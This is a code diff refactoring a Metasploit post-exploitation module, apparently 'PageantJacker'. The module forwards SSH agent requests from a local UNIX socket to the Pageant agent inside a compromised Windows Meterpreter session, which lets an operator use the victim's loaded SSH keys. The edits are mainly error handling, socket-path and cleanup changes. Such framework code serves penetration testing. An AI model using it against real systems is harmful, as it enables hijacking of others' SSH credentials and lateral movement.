@@ -31,6 +31,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -40,23 +45,22 @@ class MetasploitModule < Msf::Post
         }
       )
     )
-    register_options(
-      [
-        OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
-      ]
-    )
+    register_options([
+      OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
+    ])
+  end
+
+  def sockpath
+    @sockpath ||= "#{Dir.tmpdir}/#{Rex::Text.rand_text_alphanumeric(8)}"
   end
 
   def setup
-    unless session.extapi
-      vprint_status("Loading extapi extension...")
-      begin
-        session.core.use("extapi")
-      rescue Errno::ENOENT
-        print_error("This module is only available in a windows meterpreter session.")
-        return
-      end
-    end
+    return if session.extapi
+
+    vprint_status('Loading extapi extension...')
+    session.core.use('extapi')
+  rescue Errno::ENOENT
+    fail_with(Failure::BadConfig, 'This module is only available in a Windows meterpreter session.')
   end
 
   def run
@@ -64,79 +68,89 @@ class MetasploitModule < Msf::Post
     begin
       ::UNIXServer
     rescue NameError
-      print_error("This module is only supported on a Metasploit installation that supports UNIX sockets.")
-      return false
+      fail_with(Failure::BadConfig, 'This module is only supported on a Metasploit installation that supports UNIX sockets.')
     end
 
     # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
     if datastore['SocketPath']
+      # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
+      if ::File.exist?(datastore['SocketPath'].to_s)
+        fail_with(Failure::BadConfig, "Socket (#{datastore['SocketPath']}) already exists. Remove it or choose another path and try again.")
+      end
       @sockpath = datastore['SocketPath'].to_s
-    else
-      @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
-    end
-
-    # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
-    if ::File.exist?(@sockpath)
-      print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
-      return false
     end
 
     # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
-    ::UNIXServer.open(@sockpath) do |serv|
-      print_status("Launched listening socket on #{@sockpath}")
-      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
-      print_status("Now use any tool normally (e.g. ssh-add)")
+    ::UNIXServer.open(sockpath) do |serv|
+      File.chmod(0o0700, sockpath)
 
-      loop do
-        s = serv.accept
-        loop do
-          socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
-          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
+      print_status("Launched listening socket on #{sockpath}")
+      print_status("Set SSH_AUTH_SOCK variable to #{sockpath} (e.g. export SSH_AUTH_SOCK=\"#{sockpath}\")")
+      print_status('Now use any SSH tool normally (e.g. ssh-add)')
 
-          vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
-          response = session.extapi.pageant.forward(socket_request_data.first, socket_request_data.first.size)
-          if response[:success]
+      while (s = serv.accept)
+        begin
+          while (socket_request_data = s.recvfrom(8192)) # 8192 = AGENT_MAX
+            break if socket_request_data.nil?
+
+            data = socket_request_data.first
+
+            break if data.nil? || data.empty?
+
+            vprint_status("PageantJacker: Received data from socket (size: #{data.size})")
+
+            response = session.extapi.pageant.forward(data, data.size)
+
+            unless response[:success]
+              print_error("PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})")
+              next
+            end
+
+            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
+
             begin
-              s.send response[:blob], 0
-            rescue
+              s.send(response[:blob], 0)
+            rescue StandardError
               break
             end
-            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
-          else
-            print_error("PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})")
           end
+        rescue Errno::ECONNRESET
+          vprint_status('PageantJacker: Received reset from client, ignoring.')
         end
       end
     end
   end
 
   def cleanup
+    return unless @sockpath
+
     # Remove the socket that we created, if it still exists
-    ::File.delete(@sockpath) if ::File.exist?(@sockpath) if @sockpath
+    ::File.delete(@sockpath) if ::File.exist?(@sockpath)
+  ensure
+    super
   end
 
   def translate_error(errnum)
     errstring = "#{errnum}: "
     case errnum
     when 0
-      errstring += "No error"
+      errstring + 'No error'
     when 1
-      errstring += "The Pageant request was not processed."
+      errstring + 'The Pageant request was not processed.'
     when 2
-      errstring += "Unable to obtain IPC memory address."
+      errstring + 'Unable to obtain IPC memory address.'
     when 3
-      errstring += "Unable to allocate memory for Pageant<-->Meterpreter IPC."
+      errstring + 'Unable to allocate memory for Pageant<-->Meterpreter IPC.'
     when 4
-      errstring += "Unable to allocate memory buffer."
+      errstring + 'Unable to allocate memory buffer.'
     when 5
-      errstring += "Unable to build Pageant request string."
+      errstring + 'Unable to build Pageant request string.'
     when 6
-      errstring += "Pageant not found."
+      errstring + 'Pageant not found.'
     when 7
-      errstring += "Not forwarded."
+      errstring + 'Not forwarded.'
     else
-      errstring += "Unknown."
+      errstring + 'Unknown.'
     end
-    errstring
   end
 end
